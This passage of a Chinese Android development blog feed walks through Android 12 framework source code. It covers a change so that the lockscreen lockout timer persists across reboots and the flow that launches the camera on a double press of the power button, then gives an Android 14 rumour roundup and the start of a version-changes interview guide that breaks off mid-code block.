&#123;</span><br><span class="line">        // For secure password storage (that is required for FRP), the underlying storage also</span><br><span class="line">        // enforces the deadline. Since we cannot store settings for the FRP user, don&#x27;t.</span><br><span class="line">        return deadline;</span><br><span class="line">    &#125;</span><br><span class="line">    mLockoutDeadlines.put(userId, deadline);</span><br><span class="line">    return deadline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由代码得知，其实参数是时间间隔，然后通过**SystemClock.elapsedRealtime()**这个方法获取开机时间加上时间间隔，然后得到计时结束的时间戳存储起来。</p><p>其实每次亮屏后会出现倒计时的界面是重新获取了计时结束的时间戳，如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void onPause() &#123;</span><br><span class="line">    super.onPause();</span><br><span class="line">    mResumed = false;</span><br><span class="line"></span><br><span class="line">    if (mCountdownTimer != null) &#123;</span><br><span class="line">        mCountdownTimer.cancel();</span><br><span class="line">        mCountdownTimer = null;</span><br><span class="line">    &#125;</span><br><span class="line">    if (mPendingLockCheck != null) &#123;</span><br><span class="line">        mPendingLockCheck.cancel(false);</span><br><span class="line">        mPendingLockCheck = null;</span><br><span class="line">    &#125;</span><br><span class="line">    reset();</span><br><span class="line">&#125;</span><br><span class="line">     </span><br><span class="line">@Override</span><br><span class="line">public void reset() &#123;</span><br><span class="line">    // start fresh</span><br><span class="line">    mDismissing = false;</span><br><span class="line">    mView.resetPasswordText(false /* animate */, false /* announce */);</span><br><span class="line">    // if the user is currently locked out, enforce it.</span><br><span class="line">    long deadline = mLockPatternUtils.getLockoutAttemptDeadline(</span><br><span class="line">            KeyguardUpdateMonitor.getCurrentUser());</span><br><span class="line">    /* UNISOC: Modify for bug1692403, 1760268 &#123;@ */</span><br><span class="line">    if (shouldLockout(deadline)) &#123;</span><br><span class="line">        handleAttemptLockout(deadline);</span><br><span class="line">    &#125; else if (KeyguardSecurityContainerController.mDeadLine == 0</span><br><span class="line">            &amp;&amp; mView.getVisibility() == View.VISIBLE) &#123;</span><br><span class="line">        resetState();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的**mLockPatternUtils.getLockoutAttemptDeadline(KeyguardUpdateMonitor.getCurrentUser());**方法就是获取的计时结束时间戳，通过判断是否时间戳是否失效，设置界面倒计时是否显示，所以再看一下获取的计时结束时间戳的方法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">    * @return The elapsed time in millis in the future when the user is allowed to</span><br><span class="line">    *   attempt to enter their lock pattern, or 0 if the user is welcome to</span><br><span class="line">    *   enter a pattern.</span><br><span class="line">    */</span><br><span class="line">public long getLockoutAttemptDeadline(int userId) &#123;</span><br><span class="line">    final long deadline = mLockoutDeadlines.get(userId, 0L);</span><br><span class="line">    final long now = SystemClock.elapsedRealtime();</span><br><span class="line">    if (deadline &lt; now &amp;&amp; deadline != 0) &#123;</span><br><span class="line">        // timeout expired</span><br><span class="line">        mLockoutDeadlines.put(userId, 0);</span><br><span class="line">        return 0L;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    if (deadline &gt; (now + timeoutMs)) &#123;</span><br><span class="line">        // device was rebooted, set new deadline</span><br><span class="line">        deadline = now + timeoutMs;</span><br><span class="line">        setLong(LOCKOUT_ATTEMPT_DEADLINE, deadline, userId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return deadline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过获取存储的计时结束时间戳，然后对比现在的时间，因为**SystemClock.elapsedRealtime()**获取的是开机到现在的时间，所以只要关机重启，就会走下边的判断会根据最新的时间加上时间间隔，存储起来作为开机后的计时结束时间戳。因此就看到开后会重新等待30秒的现象，因此我们在这里想要实现效果修改逻辑。</p><p>添加代码接口，一个set，一个get，如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">    * Set and store the lockout deadline by SystemCurrentTime, meaning the user can&#x27;t attempt his/her unlock</span><br><span class="line">    * pattern until the deadline has passed.</span><br><span class="line">    * @return the chosen deadline.</span><br><span class="line">    */</span><br><span class="line">public long setLockoutAttemptDeadlineBySystemCurrentTime(int userId, int timeoutMs) &#123;</span><br><span class="line">    final long deadline = System.currentTimeMillis() + timeoutMs;</span><br><span class="line">    setLong(LOCKOUT_ATTEMPT_DEADLINE_CURRENTTIME, deadline, userId);</span><br><span class="line">    setLong(LOCKOUT_ATTEMPT_TIMEOUT_MS, timeoutMs, userId);</span><br><span class="line">    return deadline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">    * @return The SystemCurrentTime in millis in the future when the user is allowed to</span><br><span class="line">    *   attempt to enter his/her lock pattern, or 0 if the user is welcome to</span><br><span class="line">    *   enter a pattern.</span><br><span class="line">    */</span><br><span class="line">public long getLockoutAttemptDeadlineBySystemCurrentTime(int userId) &#123;</span><br><span class="line">    long deadline = getLong(LOCKOUT_ATTEMPT_DEADLINE_CURRENTTIME, 0L, userId);</span><br><span class="line">    final long now = System.currentTimeMillis();</span><br><span class="line">    if (deadline &lt; now &amp;&amp; deadline != 0) &#123;</span><br><span class="line">        // timeout expired</span><br><span class="line">        setLong(LOCKOUT_ATTEMPT_DEADLINE_CURRENTTIME, 0, userId);</span><br><span class="line">        setLong(LOCKOUT_ATTEMPT_TIMEOUT_MS, 0, userId);</span><br><span class="line">        return 0L;</span><br><span class="line">    &#125;</span><br><span class="line">    return deadline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样把对应的方法set和get方法替换了(KeyguardAbsKeyInputView.java这是PIN码和密码解锁，KeyguardPatternView.java这里是图案的)，就可以了。这样就满足了PIN码、密码和图案解锁的需求。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Android12 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 12 双击power键启动相机源码解析</title>
      <link href="/2022/09/06/2022-09-06/"/>
      <url>/2022/09/06/2022-09-06/</url>
      
        <content type="html"><![CDATA[<p>最近项目中接触到需要修改手机按键的需求，整理一下分享给大家</p><p>双击power键大概流程</p><p><img src="/images/20220906/20220906001.jpg"></p><p><strong>PhoneWindowManager.java</strong>类是 处理各种 power 键流程的地方，路径如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\frameworks\base\services\core\java\com\android\server\policy\PhoneWindowManager.java</span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">case KeyEvent.KEYCODE_POWER: &#123;</span><br><span class="line">    EventLogTags.writeInterceptPower(</span><br><span class="line">            KeyEvent.actionToString(event.getAction()),</span><br><span class="line">            mPowerKeyHandled ? 1 : 0,</span><br><span class="line">            mSingleKeyGestureDetector.getKeyPressCounter(KeyEvent.KEYCODE_POWER));</span><br><span class="line">    // Any activity on the power button stops the accessibility shortcut</span><br><span class="line">    result &amp;= ~ACTION_PASS_TO_USER;</span><br><span class="line">    isWakeKey = false; // wake-up will be handled separately</span><br><span class="line">    if (down) &#123;</span><br><span class="line">        /*SPRD : add power debug log start*/</span><br><span class="line">        Slog.d(TAG, &quot;Receive Input KeyEvent of Powerkey down&quot;);</span><br><span class="line">        /*SPRD : add power debug log end*/</span><br><span class="line">        interceptPowerKeyDown(event, interactiveAndOn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        /*SPRD : add power debug log start*/</span><br><span class="line">        Slog.d(TAG, &quot;Receive Input KeyEvent of Powerkey up&quot;);</span><br><span class="line">        /*SPRD : add power debug log end*/</span><br><span class="line">        interceptPowerKeyUp(event, canceled);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>power键按下在<strong>interceptPowerKeyDown</strong>()执行，松开的操作在<strong>interceptPowerKeyUp</strong>()中执行<strong>interceptPowerKeyDown</strong>()方法中会调用<strong>GestureLauncherService.java</strong>的 <strong>interceptPowerKeyDown</strong>()方法<br>关键代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// The camera gesture will be detected by GestureLauncherService.</span><br><span class="line">private boolean handleCameraGesture(KeyEvent event, boolean interactive) &#123;</span><br><span class="line">    // camera gesture.</span><br><span class="line">    if (mGestureLauncherService == null) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    mCameraGestureTriggered = false;</span><br><span class="line">    final MutableBoolean outLaunched = new MutableBoolean(false);</span><br><span class="line">    final boolean intercept =</span><br><span class="line">            mGestureLauncherService.interceptPowerKeyDown(event, interactive, outLaunched);</span><br><span class="line">    if (!outLaunched.value) &#123;</span><br><span class="line">        // If GestureLauncherService intercepted the power key, but didn&#x27;t launch camera app,</span><br><span class="line">        // we should still return the intercept result. This prevents the single key gesture</span><br><span class="line">        // detector from processing the power key later on.</span><br><span class="line">        return intercept;</span><br><span class="line">    &#125;</span><br><span class="line">    mCameraGestureTriggered = true;</span><br><span class="line">    if (mRequestedOrSleepingDefaultDisplay) &#123;</span><br><span class="line">        mCameraGestureTriggeredDuringGoingToSleep = true;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟踪看看<strong>GestureLauncherService.java</strong> 中 执行 **interceptPowerKeyDown()**方法如下<br><strong>GestureLauncherService.java</strong>，路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/frameworks/base/services/core/java/com/android/server/GestureLauncherService.java</span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">public boolean interceptPowerKeyDown(KeyEvent event, boolean interactive,</span><br><span class="line">            MutableBoolean outLaunched, boolean isScreenOn) &#123;</span><br><span class="line">        if (event.isLongPress()) &#123;</span><br><span class="line">            // Long presses are sent as a second key down. If the long press threshold is set lower</span><br><span class="line">            // than the double tap of sequence interval thresholds, this could cause false double</span><br><span class="line">            // taps or consecutive taps, so we want to ignore the long press event.</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        boolean launchCamera = false;</span><br><span class="line">        boolean launchEmergencyGesture = false;</span><br><span class="line">        boolean intercept = false;</span><br><span class="line">        long powerTapInterval;</span><br><span class="line">        synchronized (this) &#123;</span><br><span class="line">            powerTapInterval = event.getEventTime() - mLastPowerDown;</span><br><span class="line">            mLastPowerDown = event.getEventTime();</span><br><span class="line">            if (powerTapInterval &gt;= POWER_SHORT_TAP_SEQUENCE_MAX_INTERVAL_MS) &#123;</span><br><span class="line">                // Tap too slow, reset consecutive tap counts.</span><br><span class="line">                mPowerButtonConsecutiveTaps = 1;</span><br><span class="line">                mPowerButtonSlowConsecutiveTaps = 1;</span><br><span class="line">            &#125; else if (powerTapInterval &gt;= CAMERA_POWER_DOUBLE_TAP_MAX_TIME_MS) &#123;</span><br><span class="line">                // Tap too slow for shortcuts</span><br><span class="line">                mPowerButtonConsecutiveTaps = 1;</span><br><span class="line">                mPowerButtonSlowConsecutiveTaps++;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // Fast consecutive tap</span><br><span class="line">                mPowerButtonConsecutiveTaps++;</span><br><span class="line">                mPowerButtonSlowConsecutiveTaps++;</span><br><span class="line">            &#125;</span><br><span class="line">            // Check if we need to launch camera or emergency gesture flows</span><br><span class="line">            if (mEmergencyGestureEnabled) &#123;</span><br><span class="line">                // Commit to intercepting the powerkey event after the second &quot;quick&quot; tap to avoid</span><br><span class="line">                // lockscreen changes between launching camera and the emergency gesture flow.</span><br><span class="line">                if (mPowerButtonConsecutiveTaps &gt; 1) &#123;</span><br><span class="line">                    intercept = interactive;</span><br><span class="line">                &#125;</span><br><span class="line">                if (mPowerButtonConsecutiveTaps == EMERGENCY_GESTURE_POWER_TAP_COUNT_THRESHOLD) &#123;</span><br><span class="line">                    launchEmergencyGesture = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (mCameraDoubleTapPowerEnabled</span><br><span class="line">                    &amp;&amp; powerTapInterval &lt; CAMERA_POWER_DOUBLE_TAP_MAX_TIME_MS</span><br><span class="line">                    &amp;&amp; mPowerButtonConsecutiveTaps == CAMERA_POWER_TAP_COUNT_THRESHOLD) &#123;</span><br><span class="line">                launchCamera = true;</span><br><span class="line">                intercept = interactive;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (mPowerButtonConsecutiveTaps &gt; 1 || mPowerButtonSlowConsecutiveTaps &gt; 1) &#123;</span><br><span class="line">            Slog.i(TAG, Long.valueOf(mPowerButtonConsecutiveTaps)</span><br><span class="line">                    + &quot; consecutive power button taps detected, &quot;</span><br><span class="line">                    + Long.valueOf(mPowerButtonSlowConsecutiveTaps)</span><br><span class="line">                    + &quot; consecutive slow power button taps detected&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (launchCamera) &#123;</span><br><span class="line">            Slog.i(TAG, &quot;Power button double tap gesture detected, launching camera. Interval=&quot;</span><br><span class="line">                    + powerTapInterval + &quot;ms&quot;);</span><br><span class="line">                // 调用开启相机</span><br><span class="line">                launchCamera = handleCameraGesture(false /* useWakelock */,</span><br><span class="line">                        StatusBarManager.CAMERA_LAUNCH_SOURCE_POWER_DOUBLE_TAP);</span><br><span class="line">            if (launchCamera) &#123;</span><br><span class="line">                mMetricsLogger.action(MetricsEvent.ACTION_DOUBLE_TAP_POWER_CAMERA_GESTURE,</span><br><span class="line">                        (int) powerTapInterval);</span><br><span class="line">                mUiEventLogger.log(GestureLauncherEvent.GESTURE_CAMERA_DOUBLE_TAP_POWER);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (launchEmergencyGesture) &#123;</span><br><span class="line">            Slog.i(TAG, &quot;Emergency gesture detected, launching.&quot;);</span><br><span class="line">            launchEmergencyGesture = handleEmergencyGesture();</span><br><span class="line">            mUiEventLogger.log(GestureLauncherEvent.GESTURE_EMERGENCY_TAP_POWER);</span><br><span class="line">        &#125;</span><br><span class="line">        mMetricsLogger.histogram(&quot;power_consecutive_short_tap_count&quot;,</span><br><span class="line">                mPowerButtonSlowConsecutiveTaps);</span><br><span class="line">        mMetricsLogger.histogram(&quot;power_double_tap_interval&quot;, (int) powerTapInterval);</span><br><span class="line"></span><br><span class="line">        outLaunched.value = launchCamera || launchEmergencyGesture;</span><br><span class="line">        // Intercept power key event if the press is part of a gesture (camera, eGesture) and the</span><br><span class="line">        // user has completed setup.</span><br><span class="line">        return intercept &amp;&amp; isUserSetupComplete();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>系统会对<strong>mCameraDoubleTapPowerEnabled</strong> 取值，核心是通过resources.getBoolean(com.android.internal.R.bool.config_cameraDoubleTapPowerGestureEnabled) 来取，<br>其实这个值是配置在/frameworks/base/core/res/res/values/config.xml中，这里是为true的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Allow the gesture to double tap the power button twice to start the camera while the device</span><br><span class="line">         is non-interactive. --&gt;</span><br><span class="line">&lt;bool name=&quot;config_cameraDoubleTapPowerGestureEnabled&quot;&gt;true&lt;/bool&gt;</span><br></pre></td></tr></table></figure><p>接下来会分别对power连续按2或者1次进行判断，如果<strong>mCameraDoubleTapPowerEnabled = true</strong> 会通过比较按键的时间<strong>powerTapInterval</strong>小于系统默认时间(<strong>CAMERA_POWER_DOUBLE_TAP_MAX_TIME_MS</strong>=300毫秒),<br><strong>mPowerButtonConsecutiveTaps</strong>计数加1，说明连续按power键，或者延迟最大500毫秒内连续按键，系统预计用户接下来可能会执行一些操作，计数也会加1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static final long POWER_SHORT_TAP_SEQUENCE_MAX_INTERVAL_MS = 500;</span><br><span class="line"></span><br><span class="line">static final long CAMERA_POWER_DOUBLE_TAP_MAX_TIME_MS = 300;</span><br><span class="line"></span><br><span class="line">powerTapInterval = event.getEventTime() - mLastPowerDown;</span><br><span class="line">mLastPowerDown = event.getEventTime();</span><br><span class="line"></span><br><span class="line">if (mCameraDoubleTapPowerEnabled</span><br><span class="line">                    &amp;&amp; powerTapInterval &lt; CAMERA_POWER_DOUBLE_TAP_MAX_TIME_MS</span><br><span class="line">                    &amp;&amp; mPowerButtonConsecutiveTaps == CAMERA_POWER_TAP_COUNT_THRESHOLD)</span><br><span class="line"></span><br><span class="line">if (powerTapInterval &lt; POWER_SHORT_TAP_SEQUENCE_MAX_INTERVAL_MS)</span><br></pre></td></tr></table></figure><p>执行完成之后会调用<strong>handleCameraGesture</strong>()方法调用开启摄像机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@VisibleForTesting</span><br><span class="line">boolean handleCameraGesture(boolean useWakelock, int source) &#123;</span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, &quot;GestureLauncher:handleCameraGesture&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        boolean userSetupComplete = isUserSetupComplete();</span><br><span class="line">        if (!userSetupComplete) &#123;</span><br><span class="line">            if (DBG) &#123;</span><br><span class="line">                Slog.d(TAG, String.format(</span><br><span class="line">                        &quot;userSetupComplete = %s, ignoring camera gesture.&quot;,</span><br><span class="line">                        userSetupComplete));</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (DBG) &#123;</span><br><span class="line">            Slog.d(TAG, String.format(</span><br><span class="line">                    &quot;userSetupComplete = %s, performing camera gesture.&quot;,</span><br><span class="line">                    userSetupComplete));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (useWakelock) &#123;</span><br><span class="line">            // Make sure we don&#x27;t sleep too early</span><br><span class="line">            mWakeLock.acquire(500L);</span><br><span class="line">        &#125;</span><br><span class="line">        StatusBarManagerInternal service = LocalServices.getService(</span><br><span class="line">                StatusBarManagerInternal.class);</span><br><span class="line">        // 启动相机</span><br><span class="line">        service.onCameraLaunchGestureDetected(source);</span><br><span class="line">        return true;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原生双击启动相机流程差不多就是这样，有任何问题欢迎留言讨论</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Android12 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>曝Android 14有望支持卫星连接，Android Beam或被移除</title>
      <link href="/2022/09/05/2022-09-05/"/>
      <url>/2022/09/05/2022-09-05/</url>
      
        <content type="html"><![CDATA[<p>今年5月，谷歌I/O开发者大会正式召开。在这次活动中，Android 13亮相发布，并带来了全新功能升级。<br>不久前，谷歌向旗下的 Pixel 手机推送了 Android 13 正式版更新。现在，关于下一代 Android 14 的相关爆料信息也开始逐渐多了起来。<br><img src="/images/20220905/20220905001.png"><br>一份最新的消息显示，谷歌的下一个版本的Android系统，即Android 14，将支持卫星连接功能。<br>相关的介绍中提到，卫星连接功能将与常规LTE和5G连接存在不同，卫星连接将会提高速度、连接性和交互时间。<br>不过，鉴于新一代的Android 14 操作系统计划于 2023 年中后期正式到来，目前暂时还没有这一功能的更多细节信息出现，存在着后续出现变化的可能。<br><img src="/images/20220905/20220905002.png"><br>事实上，最近多家厂商都宣布或被曝光了即将支持卫星连接功能。<br>在华为Mate50系列的预热中，官方介绍提到华为可能会带来一些通讯技术上的突破，并给出了“向上捅破天”这一形容。<br>相关推测认为，这指代的可能就是卫星通信功能，即通过卫星通信提供紧急通讯服务。<br><img src="/images/20220905/20220905003.png"><br>同时，即将到来的全新iPhone 14系列也被多次曝光其可能会支持卫星连接功能。<br>按照目前爆料中提到的说法来看，苹果iPhone系列可能会支持低轨道卫星系统连接，其允许用户在没有信号覆盖的地区拨打电话和发送消息。<br><img src="/images/20220905/20220905004.png"><br>结合现有的爆料来看，似乎谷歌、华为、苹果都将在接下来推出卫星连接功能。这样一来，该功能将会覆盖至Android、鸿蒙、iOS等用户范围庞大的操作系统。<br>至于这项技术的功能表现，暂时还没有确切的消息出现，实际情况如何还有待验证。<br><img src="/images/20220905/20220905005.png"><br>除了卫星连接功能的支持外，最新的爆料还提到，在新一代的Android 14中，Android Beam功能可能会被彻底取消。<br>据悉，Android Beam是谷歌在 Android 4 中带来的一项NFC 共享功能。通过这一功能，支持 NFC 的Android设备之间可以直接贴近传输分享文件。<br>当然，鉴于目前距离Android 14正式到来还有着相当长的一段时间，实际的功能支持情况暂时还不能确认。</p>]]></content>
      
      
      <categories>
          
          <category> 资讯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Android14 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android各版本迭代信息集合</title>
      <link href="/2022/09/04/2022-09-04/"/>
      <url>/2022/09/04/2022-09-04/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天分享的面试题是：</p><p>Android在版本迭代中，总会进行很多改动，那么你熟知各版本都改动了什么内容？又要怎么适配呢？</p><h3 id="Android4-4"><a href="#Android4-4" class="headerlink" title="Android4.4"></a>Android4.4</h3><blockquote><p>发布ART虚拟机，提供选项可以开启。<br>HttpURLConnection的底层实现改为了OkHttp。</p></blockquote><h3 id="Android5-0"><a href="#Android5-0" class="headerlink" title="Android5.0"></a>Android5.0</h3><blockquote><p>ART成为默认虚拟机，完全代替Dalvik虚拟机。<br>Context.bindService() 方法需要显式 Intent，如果提供隐式 intent，将引发异常。</p></blockquote><h3 id="Android6-0"><a href="#Android6-0" class="headerlink" title="Android6.0"></a>Android6.0</h3><blockquote><p>增加运行时权限限制</p></blockquote><p>如果你的应用使用到了危险权限，比如在运行时进行检查和请求权限。checkSelfPermission()方法用于检查权限，requestPermissions() 方法用于请求权限。</p><blockquote><p>取消支持Apache HTTP</p></blockquote><p>Android 6.0 版移除了对 Apache HTTP相关类库的支持。要继续使用 Apache HTTP API，您必须先在 build.gradle 文件中声明以下编译时依赖项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android &#123;useLibrary &#x27;org.apache.http.legacy&#x27;&#125;</span><br></pre></td></tr></table></figure><p>有的小伙伴可能不熟悉这是啥，简单说下：</p><blockquote><blockquote><p>Apache HttpClient是Apache开源组织提供的一个开源的项目,它是一个简单的HTTP客户端（并不是浏览器），可以发送HTTP请求，接受HTTP响应。</p></blockquote></blockquote><p>所以说白了，其实就是一个请求网络的项目框架。</p><h3 id="Android-7-0"><a href="#Android-7-0" class="headerlink" title="Android 7.0"></a>Android 7.0</h3><blockquote><p>Android 7.0 引入一项新的应用签名方案 APK Signature Scheme v2</p></blockquote><blockquote><p>Toast导致的BadTokenException</p></blockquote><blockquote><p>在Android7.0系统上，Android 框架强制执行了 StrictMode API 政策禁止向你的应用外公开 file:// URI。如果一项包含文件 file:// URI类型 的 Intent 离开你的应用，应用失败，并出现 FileUriExposedException 异常，如调用系统相机拍照录制视频，或裁切照片。</p></blockquote><p>这一点其实就是限制了在应用间共享文件，如果需要在应用间共享，需要授予要访问的URI临时访问权限，我们要做的就是注册FileProvider：</p><p>1）声明FileProvider。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 